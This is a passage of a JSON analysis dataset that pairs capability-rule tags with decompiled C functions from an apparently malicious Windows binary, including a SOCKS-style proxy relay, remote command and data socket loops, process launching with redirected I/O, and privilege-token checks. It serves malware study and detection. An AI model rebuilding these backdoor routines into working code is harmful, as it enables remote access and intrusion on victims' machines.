fcn.00485eac();\n    *in_FS_OFFSET = puStack76;\n    return;\n}\n",
        "token_count": 683
    },
    "00486528": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00486528(void)\n\n{\n    char cVar1;\n    \n    **0x494a74 = 0;\n    **0x494a84 = 0;\n    fcn.0048768c();\n    if (**0x4948f0 != 0) {\n        cVar1 = fcn.00489948();\n        if (cVar1 != '\\0') {\n            fcn.0041ff18();\n        }\n    }\n    if (**0x494904 != 0) {\n        cVar1 = fcn.004884ac();\n        if (cVar1 != '\\0') {\n            fcn.0041ff18();\n        }\n    }\n    if ((**0x494bf4 != 0) && (**0x494c54 != 0)) {\n        (***0x494ca0)();\n    }\n    **0x4949f8 = 0;\n    sub.wsock32.dll_shutdown(**0x494af0, 2);\n    sub.wsock32.dll_closesocket(**0x494af0);\n    **0x494af0 = 0;\n    fcn.004865e0();\n    return;\n}\n",
        "token_count": 252
    },
    "00486918": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00486918(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uVar4;\n    uint uStack5840;\n    uint uStack5836;\n    uchar *puStack5832;\n    uint var_16b4h;\n    uint *var_16b0h;\n    int32_t iStack5808;\n    uint uStack5804;\n    uint var_16a4h;\n    uint *puStack5796;\n    uint uStack5792;\n    uint uStack5788;\n    uint var_15a0h;\n    uint var_159ch;\n    uint var_158eh;\n    uint var_58eh;\n    uint var_399h;\n    uint var_140h;\n    uint8_t var_13ch;\n    uint var_138h;\n    uint var_132h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack5832 = 0x486944;\n    fcn.00405fe8();\n    uStack5836 = 0x486e16;\n    uStack5840 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffe930;\n    puStack5832 = &stack0xfffffffc;\n    fcn.00408560();\n    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00486918::var_132h, 2, 2);\n    if (((iVar2 < 1) || (var_132h != '\\x05')) ||\n       (sub.wsock32.dll_recv(var_10h, &fcn.00486918::var_132h, var_132h._1_1_ + 2, 0),  var_132h._1_1_ - 1 < 0))\n    goto code_r0x00486de1;\n    var_24h = 0;\n    if (var_132h._2_1_ == '\\x02') {\n        if ((var_18h == 0) && (var_14h == 0)) {\n            var_132h._1_1_ = 0;\n            sub.wsock32.dll_send(var_10h, &fcn.00486918::var_132h, 2, 0);\n        }\n        else {\n            var_132h._1_1_ = 2;\n            sub.wsock32.dll_send(var_10h, &fcn.00486918::var_132h, 2, 0);\n            sub.wsock32.dll_recv(var_10h, &fcn.00486918::var_399h, 0x259, 0);\n            if (var_399h == '\\x01') {\n                fcn.00405620();\n                uVar3 = var_399h._1_1_ == 0xfffffffe;\n                fcn.00405620();\n                fcn.00405974();\n                if ((!uVar3) || (fcn.00405974(),  !uVar3)) {\n                    var_399h._1_1_ = 0xff;\n                    sub.wsock32.dll_send(var_10h, &fcn.00486918::var_399h, 2, 0);\n                    goto code_r0x00486de1;\n                }\n                var_399h._1_1_ = 0;\n                sub.wsock32.dll_send(var_10h, &fcn.00486918::var_399h, 2, 0);\n            }\n        }\n    }\n    else if (var_132h._2_1_ == '\\0') {\n        if ((var_14h != 0) || (var_18h != 0)) {\n            var_132h._1_1_ = 0xff;\n            sub.wsock32.dll_send(var_10h, &fcn.00486918::var_132h, 2, 0);\n            goto code_r0x00486de1;\n        }\n        var_132h._1_1_ = 0;\n        sub.wsock32.dll_send(var_10h, &fcn.00486918::var_132h, 2, 0);\n    }\n    else if (var_132h._1_1_ == 0) {\n        var_132h._1_1_ = 0xff;\n        sub.wsock32.dll_send(var_10h, &fcn.00486918::var_132h, 2, 0);\n        goto code_r0x00486de1;\n    }\n    uStack5788 = 2;\n    uStack5792 = 0xc;\n    puStack5796 = &fcn.00486918::var_140h;\n    uStack5804 = 0x486b46;\n    sub.wsock32.dll_recv();\n    if (var_140h._1_1_ == '\\x01') {\n        uStack5804 = 0x486b65;\n        fcn.00403af4();\n        if (var_140h._3_1_ == '\\x01') {\n            uStack5804 = 0;\n            iStack5808 = 0xc;\n            var_16b0h = &fcn.00486918::var_140h;\n            sub.wsock32.dll_recv();\n            var_15a0h._2_2_ = var_138h;\n            fcn.00408560();\n        }\n        else if (var_140h._3_1_ == '\\x03') {\n            uStack5804 = 0x486bc4;\n            fcn.00403af4();\n            uStack5804 = 0;\n            iStack5808 = var_13ch + 7;\n            var_16b0h = &fcn.00486918::var_58eh;\n            var_16b4h = var_10h;\n            sub.wsock32.dll_recv();\n            fcn.00405620();\n            fcn.004059dc();\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            var_159ch = ***(iVar2 + 0xc);\n            var_15a0h._2_2_ = sub.wsock32.dll_htons();\n        }\n        var_15a0h._0_2_ = 2;\n        puStack5832 = 0x1;\n        uStack5836 = 2;\n        uStack5840 = 0x486c49;\n        unaff_ESI = sub.wsock32.dll_socket();\n        uStack5840 = 0x10;\n        iVar2 = sub.wsock32.dll_connect(unaff_ESI, &fcn.00486918::var_15a0h);\n        var_140h._1_1_ = iVar2 != 0;\n        var_140h._0_1_ = 5;\n        var_140h._2_1_ = 0;\n        var_140h._3_1_ = '\\x01';\n        fcn.00403af4();\n        var_30h = 0x10;\n        sub.wsock32.dll_getsockname(unaff_ESI, &fcn.00486918::var_16b4h, &fcn.00486918::var_30h);\n        fcn.00408560();\n        var_138h._0_2_ = var_16b4h._2_2_;\n        sub.wsock32.dll_send(var_10h, &fcn.00486918::var_140h, 10, 0);\n        var_2ch = 5;\n        do {\n            fcn.00408738();\n            fcn.00408728();\n            fcn.00408728();\n            uVar4 = 0;\n            iVar2 = sub.wsock32.dll_select();\n            if (iVar2 != -1) {\n                cVar1 = fcn.00408710();\n                if (cVar1 != '\\0') {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 == -1) break;\n                    uVar4 = var_10h;\n                    sub.wsock32.dll_send();\n                }\n                cVar1 = fcn.00408710(uVar4);\n                if (cVar1 != '\\0') {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv(var_10h, &fcn.00486918::var_158eh, 0x1000, 0);\n                    if (iVar2 == -1) break;\n                    sub.wsock32.dll_send(unaff_ESI, &fcn.00486918::var_158eh, iVar2, 0);\n                }\n            }\n            sub.kernel32.dll_Sleep_2(0x96);\n        } while( true );\n    }\ncode_r0x00486de1:\n    sub.wsock32.dll_closesocket(var_10h);\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = unaff_ESI;\n    fcn.004060ac(0x486e1d);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2094
    },
    "00487b54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00487b54(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t *in_FS_OFFSET;\n    ushort uStackY8228;\n    ushort uStackY8226;\n    int32_t iStackY8224;\n    uchar auStackY8212 [3976];\n    uint uStackY4236;\n    uchar *puStackY4228;\n    uint uStackY4224;\n    uint uStackY4220;\n    uchar *puStackY4216;\n    uchar *puStackY4212;\n    uint uStackY4208;\n    uchar *puStackY4204;\n    uchar *puStackY4200;\n    uchar *puStackY4196;\n    uint uStackY4192;\n    int32_t iStack4160;\n    uint uStack4156;\n    uchar *puStack4152;\n    int32_t var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4152 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar1 = iVar3;\n        iVar3 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack4156 = 0x487dbd;\n    iStack4160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefc0;\n    sub.ole32.dll_CoInitialize();\n    puVar2 = sub.wsock32.dll_socket();\n    if (puVar2 != 0xffffffff) {\n        uStackY8228 = 2;\n        uStackY8226 = sub.wsock32.dll_htons();\n        iStackY8224 = sub.wsock32.dll_inet_addr();\n        if (iStackY8224 == -1) {\n            uStackY4192 = 0x487bee;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            if (iVar3 == 0) goto code_r0x00487d6d;\n            iStackY8224 = ***(iVar3 + 0xc);\n        }\n        uStackY4192 = 0x10;\n        puStackY4196 = &stack0xffffdfdc;\n        puStackY4204 = 0x487c12;\n        puStackY4200 = puVar2;\n        sub.wsock32.dll_connect();\n        puStackY4204 = NULL;\n        uStackY4208 = 1;\n        puStackY4212 = &stack0xffffdfec;\n        uStackY4220 = 0x487c23;\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uStackY4220 = 0x487c3b;\n            fcn.00409d70();\n            uStackY4220 = 0x487c51;\n            fcn.00405864();\n            uStackY4220 = 0x487c5e;\n            fcn.00475ecc();\n            uStackY4220 = 0;\n            uStackY4224 = 1;\n            puStackY4228 = &stack0xffffdfec;\n            uStackY4236 = 0x487c6f;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                uStackY4236 = 0x487c82;\n                var_10h = fcn.00464de0();\n                uStackY4236 = 0x487c93;\n                fcn.00464e70();\n                uStackY4236 = 0x487c9f;\n                var_ch = fcn.00404620();\n                while (*(iVar1 + 0xd) == '\\0') {\n                    uStackY4192 = 0;\n                    puStackY4196 = 0x2000;\n                    puStackY4200 = &stack0xffffdfec;\n                    uStackY4208 = 0x487cbb;\n                    iVar3 = sub.wsock32.dll_recv();\n                    if (iVar3 < 1) {\n                        uStackY4208 = 0x487cce;\n                        fcn.00475e2c();\n                        break;\n                    }\n                    uStackY4208 = 0x487ce4;\n                    fcn.00464efc();\n                    uStackY4208 = 0;\n                    puStackY4216 = 0x487cf0;\n                    fcn.0041b734(0, 0);\n                    do {\n                        uStackY4192 = 0x487d02;\n                        fcn.00403af4();\n                        uStackY4192 = 0x487d15;\n                        puVar4 = (**(*var_ch + 0xc))();\n                        if (puVar4 == NULL) break;\n                        uStackY4192 = 0;\n                        puStackY4200 = &stack0xffffdfec;\n                        uStackY4208 = 0x487d2b;\n                        puStackY4204 = puVar2;\n                        puStackY4196 = puVar4;\n                        sub.wsock32.dll_send();\n                        uStackY4208 = 0;\n                        puStackY4212 = 0x2000;\n                        puStackY4216 = &stack0xffffdfec;\n                        uStackY4224 = 0x487d3f;\n                        sub.wsock32.dll_recv();\n                    } while (puVar4 != NULL);\n                    if (*(iVar1 + 0xd) != '\\0') break;\n                    uStackY4192 = 0x487d54;\n                    fcn.0041beb4();\n                    uStackY4192 = 0x487d60;\n                    fcn.00475f68();\n                }\n            }\n        }\n    }\ncode_r0x00487d6d:\n    if (var_ch != NULL) {\n        uStackY4192 = 0x487d7b;\n        fcn.0040f944();\n    }\n    if (var_10h != 0) {\n        uStackY4192 = 0x487d89;\n        fcn.00464e3c();\n        uStackY4192 = 0x487d91;\n        fcn.0040f944();\n    }\n    uStackY4192 = 2;\n    puStackY4200 = 0x487d99;\n    puStackY4196 = puVar2;\n    sub.wsock32.dll_shutdown();\n    puStackY4204 = 0x487d9f;\n    puStackY4200 = puVar2;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStackY4200;\n    uStackY4192 = 0x487dc4;\n    puStackY4196 = 0x487dbc;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1508
    },
    "00487e18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00487e18(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 50
    },
    "00487e9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00487e9c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x50) != '\\0') {\n        fcn.00489e9c();\n    }\n    if (*(in_EAX + 0x51) != '\\0') {\n        fcn.00489ff0();\n    }\n    if (*(in_EAX + 0x52) != '\\0') {\n        fcn.0048b1a0();\n    }\n    if (*(in_EAX + 0x53) != '\\0') {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00487ee4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00487ee4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x50) != '\\0') {\n        fcn.00489e9c();\n    }\n    if (*(in_EAX + 0x51) != '\\0') {\n        fcn.00489ff0();\n    }\n    if (*(in_EAX + 0x52) != '\\0') {\n        sub.user32.dll_SendMessageA(0xffff, 0x112, 0xf170, 2);\n    }\n    if (*(in_EAX + 0x53) != '\\0') {\n        fcn.0048b1a0();\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00487f2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00487f2c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *in_FS_OFFSET;\n    uchar uVar6;\n    ushort uStackY8236;\n    ushort uStackY8234;\n    int32_t iStackY8232;\n    uchar auStackY8220 [3976];\n    uint uStackY4244;\n    uchar *puStackY4236;\n    uint uStackY4232;\n    uint uStackY4228;\n    uchar *puStackY4224;\n    uchar *puStackY4220;\n    uint uStackY4216;\n    uchar *puStackY4212;\n    uchar *puStackY4208;\n    uchar *puStackY4204;\n    uint uStackY4200;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    iVar4 = 2;\n    do {\n        iVar2 = iVar4;\n        iVar4 = iVar2 + -1;\n    } while (iVar2 + -1 != 0);\n    uStack4168 = 0x488265;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    puVar3 = sub.wsock32.dll_socket();\n    if (puVar3 != 0xffffffff) {\n        uStackY8236 = 2;\n        uStackY8234 = sub.wsock32.dll_htons();\n        iStackY8232 = sub.wsock32.dll_inet_addr();\n        if (iStackY8232 == -1) {\n            uStackY4200 = 0x487fcc;\n            iVar4 = sub.wsock32.dll_gethostbyname();\n            if (iVar4 == 0) goto code_r0x004881ef;\n            iStackY8232 = ***(iVar4 + 0xc);\n        }\n        uStackY4200 = 0x10;\n        puStackY4204 = &stack0xffffdfd4;\n        puStackY4212 = 0x487ff3;\n        puStackY4208 = puVar3;\n        sub.wsock32.dll_connect();\n        puStackY4212 = NULL;\n        uStackY4216 = 0x2000;\n        puStackY4220 = &stack0xffffdfe4;\n        uStackY4228 = 0x48800a;\n        iVar4 = sub.wsock32.dll_recv();\n        if (iVar4 != -1) {\n            uStackY4228 = 0x48801f;\n            fcn.00409d70();\n            uStackY4228 = 0x488035;\n            fcn.00405864();\n            uStackY4228 = 0x488043;\n            fcn.00475ecc();\n            uStackY4228 = 0;\n            uStackY4232 = 0x2000;\n            puStackY4236 = &stack0xffffdfe4;\n            uStackY4244 = 0x48805a;\n            iVar4 = sub.wsock32.dll_recv();\n            if (iVar4 != -1) {\n                uStackY4244 = 0x48806e;\n                fcn.00405584();\n                **0x494cb8 = *(iVar2 + 0x44);\n                uStackY4244 = 0x48807d;\n                fcn.00488b18();\n                uStackY4244 = 0x488089;\n                var_14h = fcn.00404620();\n                uStackY4244 = 0x48809a;\n                var_18h = fcn.0041fa34();\n                *(var_18h + 0xf) = 1;\n                uStackY4244 = 0x4880ae;\n                fcn.0041fc40();\n                uStackY4244 = 0x4880b9;\n                fcn.004889d0();\n                uStackY4244 = 0x4880c1;\n                fcn.0041fef0();\n                uStackY4244 = 0x4880c8;\n                fcn.00487ee4();\n                while (*(iVar2 + 0xd) == '\\0') {\n                    uStackY4200 = 0;\n                    puStackY4204 = 0x2000;\n                    puStackY4208 = &stack0xffffdfe4;\n                    uStackY4216 = 0x4880e4;\n                    iVar4 = sub.wsock32.dll_recv();\n                    uVar6 = iVar4 == 0;\n                    if (iVar4 < 1) break;\n                    do {\n                        uStackY4200 = 0x4880ff;\n                        fcn.00488d70();\n                        uStackY4200 = 0;\n                        puStackY4208 = 0x48810b;\n                        fcn.0041b734(0, 0);\n                        puStackY4208 = 0x488119;\n                        fcn.0048cdec();\n                        puStackY4208 = 0x488127;\n                        fcn.0045f550();\n                        puStackY4208 = 0x488132;\n                        fcn.00405974();\n                        if (uVar6) {\n                            puStackY4208 = 0x48813c;\n                            fcn.0041beb4();\n                            puStackY4212 = 0x488143;\n                            sub.kernel32.dll_Sleep_2();\n                        }\n                        uStackY4200 = 0x48814e;\n                        fcn.00405974();\n                    } while ((uVar6) && (uVar6 = *(iVar2 + 0xd) == '\\0',  uVar6));\n                    if (*(iVar2 + 0xd) != '\\0') break;\n                    uStackY4200 = 0x48816b;\n                    fcn.004055c8();\n                    while( true ) {\n                        uStackY4200 = 0x48817d;\n                        fcn.00403af4();\n                        uStackY4200 = 0x488190;\n                        puVar5 = (**(*var_14h + 0xc))();\n                        if (puVar5 == NULL) break;\n                        uStackY4200 = 0;\n                        puStackY4208 = &stack0xffffdfe4;\n                        uStackY4216 = 0x4881a9;\n                        puStackY4212 = puVar3;\n                        puStackY4204 = puVar5;\n                        sub.wsock32.dll_send();\n                        uStackY4216 = 0;\n                        puStackY4220 = 0x2000;\n                        puStackY4224 = &stack0xffffdfe4;\n                        uStackY4232 = 0x4881c0;\n                        sub.wsock32.dll_recv();\n                        if ((puVar5 == NULL) || (*(iVar2 + 0xd) != '\\0')) break;\n                    }\n                    if (*(iVar2 + 0xd) != '\\0') break;\n                    uStackY4200 = 0x4881d8;\n                    fcn.0041beb4();\n                    uStackY4200 = 0x4881e5;\n                    fcn.00475f68();\n                }\n            }\n        }\n    }\ncode_r0x004881ef:\n    uStackY4200 = 0x4881f6;\n    fcn.00487e9c();\n    if (var_18h != 0) {\n        uStackY4200 = 0x488204;\n        cVar1 = fcn.004889d4();\n        if (cVar1 != '\\0') {\n            uStackY4200 = 0x488210;\n            fcn.004889b4();\n            uStackY4200 = 0x488218;\n            fcn.0041ff18();\n        }\n    }\n    if (var_14h != NULL) {\n        uStackY4200 = 0x488226;\n        fcn.0040f944();\n    }\n    uStackY4200 = 2;\n    puStackY4208 = 0x488231;\n    puStackY4204 = puVar3;\n    sub.wsock32.dll_shutdown();\n    puStackY4212 = 0x48823a;\n    puStackY4208 = puVar3;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = puStackY4208;\n    uStackY4200 = 0x48826c;\n    puStackY4204 = 0x488257;\n    fcn.00405554();\n    puStackY4204 = 0x488264;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1978
    },
    "004884ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004884ac(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 49
    },
    "004889d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004889d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xd) != '\\0') {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 50
    },
    "0048a8ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0048a8ac(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x48a8c5;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x48a8df;\n        fcn.0040a928();\n        puStack920 = 0x48a8ec;\n        fcn.0040a928();\n        puStack920 = 0x48a8f9;\n        fcn.0040a928();\n        uStack924 = 0x48aa9b;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.0048a8ac::var_1h + 1;\n        fcn.00403af4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.0048a8ac::lpFileName, 0xc0000000, 3, &fcn.0048a8ac::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f70();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.0048a8ac::var_323h, 0xc0000000, 3, &fcn.0048a8ac::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n            else {\n                fcn.00403af4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.0048a8ac::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.0048a8ac::var_368h, \n                                   &fcn.0048a8ac::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x48aaa2);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1060
    },
    "0048b104": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b104(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffcc;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48b11c;\n    fcn.004059cc();\n    puStack28 = 0x48b124;\n    fcn.004059cc();\n    uStack32 = 0x48b18f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc();\n    iVar2 = sub.kernel32.dll_LoadLibraryA(uVar1);\n    if ((iVar2 != 0) && (iVar2 = sub.kernel32.dll_GetModuleHandleA_2(uVar1),  iVar2 != 0)) {\n        uVar1 = fcn.004059dc();\n        uVar1 = sub.kernel32.dll_GetProcAddress_1(iVar2, uVar1);\n        *param_1 = uVar1;\n        in_stack_ffffffcc = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405554(0x48b196);\n    return;\n}\n",
        "token_count": 330
    },
    "0048b908": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048ba76)\n\nvoid fcn.0048b908(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint ReturnLength;\n    int32_t var_14h;\n    int32_t TokenInformation;\n    uint TokenHandle;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x48bab3;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48ba4e;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = &fcn.0048b908::TokenHandle;\n    uStack76 = 8;\n    uStack80 = 0x48b943;\n    uStack80 = sub.kernel32.dll_GetCurrentProcess();\n    puStack84 = 0x48b949;\n    iVar1 = sub.advapi32.dll_OpenProcessToken();\n    if (iVar1 == 0) {\n        puStack84 = 0x48ba44;\n        fcn.00405584();\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x48ba70;\n        fcn.00409b7c();\n        *in_FS_OFFSET = puStack84;\n        uStack76 = 0x48baba;\n        uStack80 = 0x48baaa;\n        fcn.00405530();\n        uStack80 = 0x48bab2;\n        fcn.00405530();\n        return;\n    }\n    uStack88 = 0x48ba30;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x12, &fcn.0048b908::TokenInformation, 4, &fcn.0048b908::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else if (TokenInformation == 1) {\n        fcn.004055c8();\n    }\n    else if (TokenInformation == 2) {\n        fcn.004055c8();\n    }\n    else if (TokenInformation == 3) {\n        fcn.004055c8();\n    }\n    else {\n        fcn.004055c8();\n    }\n    uVar2 = TokenHandle;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x14, &fcn.0048b908::var_14h, 4, &fcn.0048b908::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.00405584();\n    }\n    else if (var_14h == 0) {\n        